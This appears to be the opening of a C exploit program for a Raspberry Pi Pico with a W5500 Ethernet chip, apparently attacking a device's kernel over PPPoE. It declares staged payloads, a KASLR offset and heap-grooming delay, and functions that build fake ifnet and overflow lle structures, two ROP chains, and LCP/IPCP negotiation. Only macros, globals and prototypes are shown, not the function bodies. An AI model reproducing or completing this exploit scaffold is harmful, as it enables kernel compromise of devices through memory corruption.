#include <stdio.h>
#include <stdlib.h>
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "offset.h"
#include "defines.h"
#include "packet.c"
#include "wiznet/w5500.h"
#include "wiznet/socket.h"
#include "wiznet/wizchip_conf.h"
#include "../stage1.h"
#include "../stage2.h"

#define STAGE2_PORT 9020
#define LED_PIN 25

#define V64BE(list, index, data) {uint64_t temp = htobe64(data); memcpy(&(list)[index], &temp, sizeof(uint64_t));}
#define V64(list, index, data) {uint64_t temp = htole64(data); memcpy(&(list)[index], &temp, sizeof(uint64_t));}
#define V32(list, index, data) {uint32_t temp = htole32(data); memcpy(&(list)[index], &temp, sizeof(uint32_t));}
#define V16(list, index, data) {uint16_t temp = htole16(data); memcpy(&(list)[index], &temp, sizeof(uint16_t));}
#define V8(list, index, data) {uint8_t temp = data; memcpy(&(list)[index], &temp, sizeof(uint8_t));}

#define CHECK_RET(value) { int ret = (value); if(ret != RETURN_SUCCESS) return ret;}

typedef uint16_t (*ppp_negotiation_cb)(uint8_t**);

static uint16_t p16be(uint64_t val) {
    return htobe16((uint16_t)(val & 0xffffULL));
}
static uint8_t ret = 0;
static uint8_t wait_after_pin = 1;
static uint8_t groom_delay = 4;
static uint8_t packet[NET_MAX_BUF];
static uint8_t target_mac[6], source_mac[6];
static uint8_t target_ipv6[16];
static uint64_t pppoe_softc;
static uint16_t size;
static uint64_t pppoe_softc_list;
static uint64_t kaslr_offset;
const static uint64_t SIN6_ADDR = 0x4141414141414141;


int run();
int _run();
void updateSourceMac(uint64_t value);
uint64_t kdlsym(uint64_t addr);
int stage0();
int stage1();
int stage2();
int stage3();
int stage4();
int ppp_byebye();
uint16_t build_fake_ifnet(uint8_t **fake_ifnet);
uint16_t build_overflow_lle(uint8_t **overflow_lle);
uint16_t build_fake_lle(uint8_t **fake_lle);
void build_second_rop(uint8_t *rop);
void build_first_rop(uint8_t *rop);
int ppp_negotiation(const ppp_negotiation_cb cb);
int lcp_negotiation();
int ipcp_negotiation();

static void printIPv6(uint8_t *ipv6) {
    printf("[+] Target IPv6: %02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x\n",
        ipv6[0], ipv6[1], ipv6[2], ipv6[3], ipv6[4], ipv6[5], ipv6[6], ipv6[7],
        ipv6[8], ipv6[9], ipv6[10], ipv6[11], ipv6[12], ipv6[13], ipv6[14], ipv6[15]
    );
}


//     std::vector<uint8_t> stage1_bin{};
//     std::vector<uint8_t> stage2_bin{};
//     bool wait_padi{};
//     std::atomic<bool> running{};